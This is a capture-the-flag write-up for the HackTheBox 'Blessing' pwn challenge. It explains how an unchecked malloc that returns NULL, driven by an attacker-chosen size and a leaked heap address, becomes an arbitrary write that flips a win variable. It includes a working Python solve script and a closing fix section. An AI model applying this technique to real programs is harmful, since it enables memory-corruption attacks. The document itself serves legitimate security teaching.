## Overview

Blessing is a Very Easy HackTheBox **Pwn** challenge — an x86-64 binary built
with glibc 2.35 and *every* mitigation enabled: Full RELRO, stack canary, PIE,
and NX. Despite all that, you never touch a return address or leak libc. The
program leaks a heap pointer "as a gift", then performs an arbitrary write
driven entirely by an attacker-controlled allocation size — all you do is flip
one variable from `1` to `0`.

## The technique

The win condition is a single byte of state. `main` does roughly:

```c
char *chunk1 = malloc(0x30000);   // large -> mmap'd
*chunk1 = 1;                      // the win GATE
printf("...gift... this: %p\n", chunk1);   // <-- LEAKS chunk1's address

scanf("%lu", &size);              // attacker-controlled size
char *chunk2 = malloc(size);      // return value NEVER checked
read(0, chunk2, size);
*(long *)(chunk2 + size - 1) = 0; // "null-terminate" the last 8 bytes
write(1, chunk2, size);

if (*chunk1 == 0)                 // GATE
    read_flag();                  // open("./flag.txt") and print it
```

`read_flag()` is the whole prize — it just streams `./flag.txt`. So the goal is
purely to make `*chunk1 == 0`.

A normal overflow can't reach `chunk1`: `malloc(0x30000)` is above glibc's mmap
threshold, so `chunk1` is `mmap`'d, and the second large allocation is placed
*below* it (mmap grows downward) in the same contiguous mapping. Writing forward
from `chunk2` never reaches `chunk1`. We need a write to an address we choose.

That comes from the unchecked `malloc`. The program never validates the return
value, so if we request an astronomically large `size`, `malloc` fails and
returns `NULL` — meaning `chunk2 == 0`. The "null terminator" line then becomes:

```
*(long *)(chunk2 + size - 1) = 0   ==>   *(long *)(size - 1) = 0
```

an [arbitrary 8-byte write](https://cwe.mitre.org/data/definitions/787.html) to
address `size - 1`. The surrounding `read(0, NULL, size)` and
`write(1, NULL, size)` just return `EFAULT` and do nothing, so execution
continues. This is a textbook
[unchecked return value reused as a write base](https://cwe.mitre.org/data/definitions/690.html)
turning into a
[write-what-where condition](https://cwe.mitre.org/data/definitions/123.html).

Since we leaked `chunk1`, we set `size = leaked_chunk1 + 1`, so
`size - 1 == &chunk1` and the write zeroes `*chunk1` → `read_flag()` fires.

## Solution

One operational wrinkle: `read_flag()` prints the flag **one unbuffered
`write()` per byte** over a `socat`-bridged socket, and the client read stalls
after a few bytes with no EOF. Closing our write half with
`shutdown(SHUT_WR)` unblocks the remote and flushes the rest. A raw socket loop
was more reliable than pwntools `recv` here.

Create `solve.py`:

```python
import socket, sys, re, time

def solve(host, port):
    s = socket.create_connection((host, port), timeout=10); s.settimeout(8)
    b = b""
    while b"length: " not in b: b += s.recv(4096)
    leak = int(re.search(rb"this: (0x[0-9a-f]+)", b).group(1), 16)   # chunk1 ("the gift")
    s.sendall(str(leak + 1).encode() + b"\n")                        # size-1 == &chunk1
    while b"song: " not in b: b += s.recv(4096)
    s.sendall(b"A\n"); s.shutdown(socket.SHUT_WR)                    # flush the byte stream
    out, t = b"", time.time()
    while time.time() - t < 30:
        try: c = s.recv(4096)
        except socket.timeout: continue
        if not c: break
        out += c
        if b"HTB{" in out and b"}" in out.split(b"HTB{", 1)[1]: break
    print(re.search(rb"HTB\{[^}]*\}", out).group(0).decode())

solve(sys.argv[1], int(sys.argv[2]))
```

Run it against the instance:

```bash
python3 solve.py <host> <port>
# [+] chunk1 leak = 0x7f...010
# HTB{...}
```

## Why it worked

The binary's defenses (Full RELRO, canary, PIE, NX) all protect *control flow* —
return addresses, GOT entries, the stack. This bug never corrupts control flow.
It's a pure data write against a logic gate: an unchecked allocator return makes
a pointer `NULL`, and an attacker-controlled length turns a "harmless" trailing
null-terminator into an arbitrary write to a leaked address. With the win gated
on a data value rather than code execution, flipping that one variable is the
entire exploit.

## Fix / defense

```c
if (size > MAX_ALLOC) errx(1, "size too large");   // clamp attacker sizes
char *p = malloc(size);
if (!p) { perror("malloc"); exit(1); }              // fail closed on NULL
if (size) p[size - 1] = 0;                           // never index by an unvalidated length
```

Always check `malloc`/`calloc`/`realloc` for `NULL` before dereferencing the
result, clamp untrusted sizes to a sane maximum, and never compute a write index
like `ptr + size - 1` from an unvalidated length. Building with
`_FORTIFY_SOURCE` and treating allocator failure as fatal closes this entirely.
